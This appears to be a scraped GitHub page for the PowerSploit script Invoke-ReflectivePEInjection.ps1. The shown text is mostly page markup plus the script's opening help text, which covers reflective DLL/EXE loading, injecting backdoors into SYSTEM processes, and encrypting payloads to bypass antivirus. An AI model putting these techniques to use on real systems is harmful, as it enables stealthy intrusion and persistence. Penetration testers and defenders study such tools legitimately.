  <a href="https://github.com/clymb3r/PowerShell/blob/{{ urlEncodedRefName }}/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" class="SelectMenu-item" role="menuitemradio" rel="nofollow" aria-checked="{{ isCurrent }}" data-index="{{ index }}" >
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check SelectMenu-icon SelectMenu-icon--check">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    <span class="flex-1 css-truncate css-truncate-overflow {{ isFilteringClass }}">{{ refName }}</span>
    <span hidden="{{ isNotDefault }}" class="Label Label--secondary flex-self-start">default</span>
  </a>
</template>


            <div data-target="ref-selector.listContainer" role="menu" class="SelectMenu-list" data-turbo-frame="repo-content-turbo-frame">
              <div class="SelectMenu-loading pt-3 pb-0 overflow-hidden" aria-label="Menu is loading">
                <svg style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" data-view-component="true" class="anim-rotate">
  <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" />
  <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg>
              </div>
            </div>
              <footer class="SelectMenu-footer"><a href="/clymb3r/PowerShell/tags">View all tags</a></footer>
          </ref-selector>
        </div>
      </tab-container>
    </input-demux>
  </div>
</div>

  </details>

</div>


<div class="Overlay--hidden Overlay-backdrop--center" data-modal-dialog-overlay>
  <modal-dialog role="dialog" id="warn-tag-match-create-branch-dialog" aria-modal="true" aria-labelledby="warn-tag-match-create-branch-dialog-header" data-view-component="true" class="Overlay Overlay--width-large Overlay--height-auto Overlay--motion-scaleFade">
      <header class="Overlay-header Overlay-header--large Overlay-header--divided">
        <div class="Overlay-headerContentWrap">
          <div class="Overlay-titleWrap">
            <h1 id="warn-tag-match-create-branch-dialog-header" class="Overlay-title">Name already in use</h1>
          </div>
          <div class="Overlay-actionWrap">
            <button data-close-dialog-id="warn-tag-match-create-branch-dialog" aria-label="Close" type="button" data-view-component="true" class="close-button Overlay-closeButton"><svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg></button>
          </div>
        </div>
      </header>
    <div class="Overlay-body ">
      
          <div data-view-component="true">      A tag already exists with the provided branch name. Many Git commands accept both tag and branch names, so creating this branch may cause unexpected behavior. Are you sure you want to create this branch?
</div>

    </div>
      <footer class="Overlay-footer Overlay-footer--alignEnd">
            <button data-close-dialog-id="warn-tag-match-create-branch-dialog" type="button" data-view-component="true" class="btn">    Cancel
</button>
            <button data-submit-dialog-id="warn-tag-match-create-branch-dialog" type="button" data-view-component="true" class="btn-danger btn">    Create
</button>
      </footer>
</modal-dialog></div>


  <h2 id="blob-path" class="breadcrumb flex-auto flex-self-center min-width-0 text-normal mx-2 width-full width-md-auto flex-order-1 flex-md-order-none mt-3 mt-md-0">
    <span class="js-repo-root text-bold"><span class="js-path-segment d-inline-block wb-break-all"><a data-turbo-frame="repo-content-turbo-frame" href="/clymb3r/PowerShell"><span>PowerShell</span></a></span></span><span class="separator">/</span><span class="js-path-segment d-inline-block wb-break-all"><a data-turbo-frame="repo-content-turbo-frame" href="/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection"><span>Invoke-ReflectivePEInjection</span></a></span><span class="separator">/</span><strong class="final-path">Invoke-ReflectivePEInjection.ps1</strong>
  </h2>
    <a href="/clymb3r/PowerShell/find/master" data-pjax="" data-hotkey="t" data-view-component="true" class="btn mr-2 d-none d-md-block">    Go to file
</a>
  <details id="blob-more-options-details" data-view-component="true" class="details-overlay details-reset position-relative">
    <summary role="button" data-view-component="true" class="btn">    <svg aria-label="More options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg>
</summary>
  <div data-view-component="true">      <ul class="dropdown-menu dropdown-menu-sw">
        <li class="d-block d-md-none">
          <a class="dropdown-item d-flex flex-items-baseline" data-hydro-click="{&quot;event_type&quot;:&quot;repository.click&quot;,&quot;payload&quot;:{&quot;target&quot;:&quot;FIND_FILE_BUTTON&quot;,&quot;repository_id&quot;:9093330,&quot;originating_url&quot;:&quot;https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="173827f7f9ae9c93bf6103753c0e214e27e30d60bedd8eb835402334655d0622" data-ga-click="Repository, find file, location:repo overview" data-hotkey="t" href="/clymb3r/PowerShell/find/master">
            <span class="flex-auto">Go to file</span>
            <span class="text-small color-fg-muted" aria-hidden="true">T</span>
</a>        </li>
        <li data-toggle-for="blob-more-options-details">
            <button data-toggle-for="jumpto-line-details-dialog" type="button" data-view-component="true" class="dropdown-item btn-link">    <span class="d-flex flex-items-baseline">
              <span class="flex-auto">Go to line</span>
              <span class="text-small color-fg-muted" aria-hidden="true">L</span>
            </span>
</button>        </li>
        <li class="dropdown-divider" role="none"></li>
        <li>
          <clipboard-copy data-toggle-for="blob-more-options-details" aria-label="Copy path" value="Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" data-view-component="true" class="dropdown-item cursor-pointer">
    
            Copy path

</clipboard-copy>        </li>
        <li>
          <clipboard-copy data-toggle-for="blob-more-options-details" aria-label="Copy permalink" value="https://github.com/clymb3r/PowerShell/blob/bc6d547dcbcdaa2277748975d52ef748755723a4/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" data-view-component="true" class="dropdown-item cursor-pointer">
    
            <span class="d-flex flex-items-baseline">
              <span class="flex-auto">Copy permalink</span>
            </span>

</clipboard-copy>        </li>
      </ul>
</div>
</details></div>





    <div id="spoof-warning" class="mt-0 pb-3" hidden aria-hidden>
  <div data-view-component="true" class="flash flash-warn mt-0 clearfix">
  
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert float-left mt-1">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>

      <div class="overflow-hidden">This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.</div>


  
</div></div>

    <include-fragment src="/clymb3r/PowerShell/spoofed_commit_check/bc6d547dcbcdaa2277748975d52ef748755723a4" data-test-selector="spoofed-commit-check"></include-fragment>

    <div class="Box d-flex flex-column flex-shrink-0 mb-3">
  <include-fragment src="/clymb3r/PowerShell/contributors/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" class="commit-loader">
    <div class="Box-header d-flex flex-items-center">
      <div class="Skeleton avatar avatar-user flex-shrink-0 ml-n1 mr-n1 mt-n1 mb-n1" style="width:24px;height:24px;"></div>
      <div class="Skeleton Skeleton--text col-5 ml-2">&nbsp;</div>
    </div>

    <div class="Box-body d-flex flex-items-center" >
      <div class="Skeleton Skeleton--text col-1">&nbsp;</div>
      <span class="color-fg-danger h6 loader-error">Cannot retrieve contributors at this time</span>
    </div>
</include-fragment></div>








  
    <div data-target="readme-toc.content" class="Box mt-3 position-relative">
      
  <div
    class="Box-header js-blob-header py-2 pr-2 d-flex flex-shrink-0 flex-md-row flex-items-center"
    
  >


  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1">

      2949 lines (2455 sloc)
      <span class="file-info-divider"></span>
    134 KB
  </div>

  <div class="d-flex py-1 py-md-0 flex-auto flex-order-1 flex-md-order-2 flex-sm-grow-0 flex-justify-between hide-sm hide-md">
      

    <div class="BtnGroup">
        <a data-permalink-href="/clymb3r/PowerShell/raw/bc6d547dcbcdaa2277748975d52ef748755723a4/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" href="/clymb3r/PowerShell/raw/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" id="raw-url" group_item="true" data-view-component="true" class="js-permalink-replaceable-link Button--secondary Button--small Button">    <span class="Button-content">
      <span class="Button-label">Raw</span>
    </span>
</a>  
          <a data-permalink-href="/clymb3r/PowerShell/blame/bc6d547dcbcdaa2277748975d52ef748755723a4/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" href="/clymb3r/PowerShell/blame/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" group_item="true" data-hotkey="b" data-view-component="true" class="js-update-url-with-hash js-permalink-replaceable-link Button--secondary Button--small Button">    <span class="Button-content">
      <span class="Button-label">Blame</span>
    </span>
</a>  
    </div>

    <div class="d-flex">
        
<div class="ml-1" >
  <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="BtnGroup-parent js-update-url-with-hash " data-turbo="false" action="/clymb3r/PowerShell/edit/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="HwJ3maeBEClRiZuv_aLiUXauykYjjKQ3JU_cR8SoIfN5EhxjJtQcK2gxmFX7bFbWkCaH7rXncbgfoZEFy5Fv7g" autocomplete="off" />
      <button disabled="disabled" title="You must be signed in to make or propose changes" data-hotkey="e" data-disable-with="" type="submit" data-view-component="true" class="btn-sm BtnGroup-item btn">    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-pencil">
    <path d="M11.013 1.427a1.75 1.75 0 0 1 2.474 0l1.086 1.086a1.75 1.75 0 0 1 0 2.474l-8.61 8.61c-.21.21-.47.364-.756.445l-3.251.93a.75.75 0 0 1-.927-.928l.929-3.25c.081-.286.235-.547.445-.758l8.61-8.61Zm.176 4.823L9.75 4.81l-6.286 6.287a.253.253 0 0 0-.064.108l-.558 1.953 1.953-.558a.253.253 0 0 0 .108-.064Zm1.238-3.763a.25.25 0 0 0-.354 0L10.811 3.75l1.439 1.44 1.263-1.263a.25.25 0 0 0 0-.354Z"></path>
</svg>
</button></form>
  <details class="details-reset details-overlay select-menu BtnGroup-parent d-inline-block position-relative">
      <summary data-disable-invalid="" data-disable-with="" data-dropdown-tracking="{&quot;type&quot;:&quot;blob_edit_dropdown.more_options_click&quot;,&quot;context&quot;:{&quot;repository_id&quot;:9093330,&quot;actor_id&quot;:null,&quot;github_dev_enabled&quot;:false,&quot;edit_enabled&quot;:false,&quot;small_screen&quot;:false}}" aria-label="Select additional options" data-view-component="true" class="js-blob-dropdown-click select-menu-button btn-sm btn BtnGroup-item float-none px-2">
</summary>    <div class="SelectMenu right-0">
      <div class="SelectMenu-modal width-full">
        <div class="SelectMenu-list SelectMenu-list--borderless py-2">
          <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="SelectMenu-item js-update-url-with-hash " data-turbo="false" action="/clymb3r/PowerShell/edit/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1" accept-charset="UTF-8" method="post"><input type="hidden" name="authenticity_token" value="pgDYt9aUCuyZs4lPYlEC6v3gYM5uIUfFEMKmhLot15fAELNNV8EG7qALirVkn7ZtG2gtZvhKkkoqLOvGtRSZig" autocomplete="off" />
              <button disabled="disabled" title="You must be signed in to make or propose changes" type="submit" data-view-component="true" class="btn-invisible btn width-full d-flex flex-justify-between color-fg-muted text-normal p-0">    <div class="mr-5">Edit this file</div>
              <div class="color-fg-muted">E</div>
</button></form>

            <a data-platforms="windows,mac" aria-label="Open this file in GitHub Desktop" href="https://desktop.github.com" data-view-component="true" class="SelectMenu-item no-wrap js-remove-unless-platform width-full text-normal color-fg-default f5">
              Open in GitHub Desktop
</a>        </div>
      </div>
    </div>
  </details>
</div>


        
<div >
  </div>


          <button class="btn-octicon btn-octicon-danger disabled tooltipped tooltipped-nw" disabled
            aria-label="You must be signed in to make or propose changes" type="button">
            <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-trash">
    <path d="M11 1.75V3h2.25a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5H5V1.75C5 .784 5.784 0 6.75 0h2.5C10.216 0 11 .784 11 1.75ZM4.496 6.675l.66 6.6a.25.25 0 0 0 .249.225h5.19a.25.25 0 0 0 .249-.225l.66-6.6a.75.75 0 0 1 1.492.149l-.66 6.6A1.748 1.748 0 0 1 10.595 15h-5.19a1.75 1.75 0 0 1-1.741-1.575l-.66-6.6a.75.75 0 1 1 1.492-.15ZM6.5 1.75V3h3V1.75a.25.25 0 0 0-.25-.25h-2.5a.25.25 0 0 0-.25.25Z"></path>
</svg>
          </button>
    </div>
  </div>

    <div class="d-flex hide-lg hide-xl flex-order-2 flex-grow-0">
      <details class="dropdown details-reset details-overlay d-inline-block">
        <summary
          class="js-blob-dropdown-click btn-octicon"
          aria-haspopup="true"
          aria-label="possible actions"
          
          data-dropdown-tracking="{&quot;type&quot;:&quot;blob_edit_dropdown.more_options_click&quot;,&quot;context&quot;:{&quot;repository_id&quot;:9093330,&quot;actor_id&quot;:null,&quot;github_dev_enabled&quot;:false,&quot;edit_enabled&quot;:false,&quot;small_screen&quot;:true}}"
        >
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg>
        </summary>

        <ul class="dropdown-menu dropdown-menu-sw" style="width: 175px">
            <li>
                <a class="dropdown-item tooltipped tooltipped-nw js-remove-unless-platform"
                   data-platforms="windows,mac"
                   href="https://desktop.github.com">
                  Open with Desktop
                </a>
            </li>
          <li>
            <a class="dropdown-item" href="/clymb3r/PowerShell/raw/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1">
              View raw
            </a>
          </li>
            <li>
                          </li>
            <li>
              <a class="dropdown-item" href="/clymb3r/PowerShell/blame/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1">
                View blame
              </a>
            </li>

        </ul>
      </details>
    </div>
</div>


      
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-powershell  gist-border-0">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template">
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="{{ revealButtonHref }}" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div></template>
<template class="js-line-alert-template">
  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span></template>

  <table data-hpc class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip data-tagsearch-lang="PowerShell" data-tagsearch-path="Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1">
        <tr>
          <td id="L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">function</span> <span class="pl-en">Invoke-ReflectivePEInjection</span></td>
        </tr>
        <tr>
          <td id="L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="LC2" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c">&lt;#</span></span></td>
        </tr>
        <tr>
          <td id="L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="LC4" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">SYNOPSIS</span></span></span></td>
        </tr>
        <tr>
          <td id="L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="LC6" class="blob-code blob-code-inner js-file-line"><span class="pl-c">This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, </span></td>
        </tr>
        <tr>
          <td id="L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="LC7" class="blob-code blob-code-inner js-file-line"><span class="pl-c">or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, </span></td>
        </tr>
        <tr>
          <td id="L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="LC8" class="blob-code blob-code-inner js-file-line"><span class="pl-c">please lead the Notes section (GENERAL NOTES) for information on how to use them.</span></td>
        </tr>
        <tr>
          <td id="L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="LC9" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="LC10" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="LC11" class="blob-code blob-code-inner js-file-line"><span class="pl-c">1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.</span></td>
        </tr>
        <tr>
          <td id="L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="LC12" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.</span></td>
        </tr>
        <tr>
          <td id="L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="LC13" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="LC14" class="blob-code blob-code-inner js-file-line"><span class="pl-c">This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,</span></td>
        </tr>
        <tr>
          <td id="L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="LC15" class="blob-code blob-code-inner js-file-line"><span class="pl-c">this will load and execute the DLL/EXE in to memory without writing any files to disk.</span></td>
        </tr>
        <tr>
          <td id="L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="LC16" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="LC17" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="LC18" class="blob-code blob-code-inner js-file-line"><span class="pl-c">2.) Reflectively load a DLL in to memory of a remote process.</span></td>
        </tr>
        <tr>
          <td id="L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="LC19" class="blob-code blob-code-inner js-file-line"><span class="pl-c">As mentioned above, the DLL being reflectively loaded won&#39;t be displayed when tools are used to list DLLs of the running remote process.</span></td>
        </tr>
        <tr>
          <td id="L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="LC20" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="LC21" class="blob-code blob-code-inner js-file-line"><span class="pl-c">This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output</span></td>
        </tr>
        <tr>
          <td id="L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="LC22" class="blob-code blob-code-inner js-file-line"><span class="pl-c">from the DLL. The script doesn&#39;t wait for the DLL to complete execution, and doesn&#39;t make any effort to cleanup memory in the </span></td>
        </tr>
        <tr>
          <td id="L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="LC23" class="blob-code blob-code-inner js-file-line"><span class="pl-c">remote process. </span></td>
        </tr>
        <tr>
          <td id="L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="LC24" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L25" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="LC25" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L26" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="LC26" class="blob-code blob-code-inner js-file-line"><span class="pl-c">While this script provides functionality to specify a file to load from disk a URL, or a byte array, these are more for demo purposes. The way I&#39;d recommend using the script is to create a byte array</span></td>
        </tr>
        <tr>
          <td id="L27" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="LC27" class="blob-code blob-code-inner js-file-line"><span class="pl-c">containing the file you&#39;d like to reflectively load, and hardcode that byte array in to the script. One advantage of doing this is you can encrypt the byte array and decrypt it in memory, which will</span></td>
        </tr>
        <tr>
          <td id="L28" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="LC28" class="blob-code blob-code-inner js-file-line"><span class="pl-c">bypass A/V. Another advantage is you won&#39;t be making web requests. The script can also load files from SQL Server and be used as a SQL Server backdoor. Please see the Casaba</span></td>
        </tr>
        <tr>
          <td id="L29" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="LC29" class="blob-code blob-code-inner js-file-line"><span class="pl-c">blog linked below (thanks to whitey).</span></td>
        </tr>
        <tr>
          <td id="L30" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="LC30" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L31" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="LC31" class="blob-code blob-code-inner js-file-line"><span class="pl-c">PowerSploit Function: Invoke-ReflectivePEInjection</span></td>
        </tr>
        <tr>
          <td id="L32" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="LC32" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Author: Joe Bialek, Twitter: @JosephBialek</span></td>
        </tr>
        <tr>
          <td id="L33" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="33"></td>
          <td id="LC33" class="blob-code blob-code-inner js-file-line"><span class="pl-c">License: BSD 3-Clause</span></td>
        </tr>
        <tr>
          <td id="L34" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="34"></td>
          <td id="LC34" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Required Dependencies: None</span></td>
        </tr>
        <tr>
          <td id="L35" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="35"></td>
          <td id="LC35" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Optional Dependencies: None</span></td>
        </tr>
        <tr>
          <td id="L36" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="36"></td>
          <td id="LC36" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Version: 1.4</span></td>
        </tr>
        <tr>
          <td id="L37" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="37"></td>
          <td id="LC37" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L38" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="38"></td>
          <td id="LC38" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">DESCRIPTION</span></span></span></td>
        </tr>
        <tr>
          <td id="L39" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="39"></td>
          <td id="LC39" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L40" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="40"></td>
          <td id="LC40" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.</span></td>
        </tr>
        <tr>
          <td id="L41" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="41"></td>
          <td id="LC41" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L42" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="42"></td>
          <td id="LC42" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">PARAMETER</span> <span class="pl-k">PEPath</span></span></span></td>
        </tr>
        <tr>
          <td id="L43" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="43"></td>
          <td id="LC43" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L44" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="44"></td>
          <td id="LC44" class="blob-code blob-code-inner js-file-line"><span class="pl-c">The path of the DLL/EXE to load and execute. This file must exist on the computer the script is being run on, not the remote computer.</span></td>
        </tr>
        <tr>
          <td id="L45" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="45"></td>
          <td id="LC45" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L46" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="46"></td>
          <td id="LC46" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">PARAMETER</span> <span class="pl-k">PEUrl</span></span></span></td>
        </tr>
        <tr>
          <td id="L47" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="47"></td>
          <td id="LC47" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L48" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="48"></td>
